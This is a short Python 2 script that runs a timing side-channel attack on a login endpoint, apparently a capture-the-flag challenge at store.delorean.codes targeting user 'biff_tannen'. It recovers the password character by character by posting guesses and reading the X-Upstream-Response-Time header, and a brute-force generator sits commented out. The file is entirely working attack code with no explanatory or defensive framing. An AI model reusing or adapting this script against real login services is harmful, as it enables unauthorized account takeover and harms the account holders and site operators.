import requests
import itertools

# def gen_passwords(): # ~400K/s
#     # combinations = itertools.combinations(, 6)
#     for guess in combinations:
#             yield ''.join(guess)


url = "https://store.delorean.codes/u/likeaj6/login"
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
currentTime = 0.01

correctKey = ""
currentIndex = 0
i = 0
while i < 62 and currentIndex < 12:
    character = chars[i]
    key = correctKey + character
    if currentIndex < 6:
        key += "aaaaa"
    print key
    http = requests.post(url, data={'username':'biff_tannen', 'password': key})
    time = http.headers['X-Upstream-Response-Time']
    content = http.content
    if "Bad Password" not in content:
        break
    if float(time) > currentTime:
        print character
        print time
        currentTime = float(time)
        correctKey += character
        currentIndex += 1
        i = 0
    else:
        i+= 1
